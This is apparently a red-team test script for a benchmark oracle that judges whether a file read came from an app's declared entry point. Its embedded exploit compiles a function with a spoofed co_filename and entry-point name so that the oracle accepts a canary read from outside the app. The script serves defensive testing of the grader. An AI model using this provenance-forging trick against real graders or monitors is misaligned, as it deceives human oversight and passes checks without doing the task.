"""Attack: forge provenance with a crafted code object (no events-file write).

The oracle trusts the call stack it observes. ``_frame_dict`` maps a frame to the
application by ``os.path.realpath(co_filename)``; ``_provenance_problem`` then accepts the
read if the outermost app frame's ``co_qualname``/``co_name`` is a declared entry point and
a test frame sits above it. None of that is authenticated: a test can ``compile`` a function
whose ``co_filename`` points at a real file inside the app root (discovered from the app
module on PYTHONPATH) and whose name IS the entry point, then open the canary from inside it.
The app itself is lexically safe and is never called.

Distinct from A-1 (forged events file) and A-2 (planted symlink): this needs neither.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(__file__))
from _harness import report, run  # noqa: E402

SAFE_APP = '''
    import os

    class App:
        def __init__(self, base_dir):
            self.base_dir = os.path.realpath(base_dir)
        def handle_request(self, name):
            full = os.path.realpath(os.path.join(self.base_dir, name))
            if os.path.commonpath([full, self.base_dir]) != self.base_dir:
                raise PermissionError("escapes base_dir")
            with open(full, encoding="utf-8") as fh:
                return fh.read()
'''

EXPLOIT = '''
    import os
    import app  # on PYTHONPATH: its file lives inside the real app root

    def test_forged_provenance():
        canary = os.path.join(os.path.dirname(os.environ["EXHIBIT_A_ALLOWED_DIR"]), "outside", "canary.txt")
        token = os.environ["EXHIBIT_A_CANARY_TOKEN"]
        app_file = app.__file__  # a real path under app_root; realpath(app_file) is under app_root
        src = (
            "def handle_request(canary):\\n"
            "    with open(canary, encoding='utf-8') as fh:\\n"
            "        return fh.read()\\n"
        )
        ns = {}
        exec(compile(src, app_file, "exec"), ns)
        leaked = ns["handle_request"](canary)
        assert token not in leaked, "canary leaked through forged entry point"
'''


def main():
    j = run(SAFE_APP, EXPLOIT, {"App.handle_request", "handle_request"})
    return report("forged_frame_filename", j, app_is_safe=True)


if __name__ == "__main__":
    main()
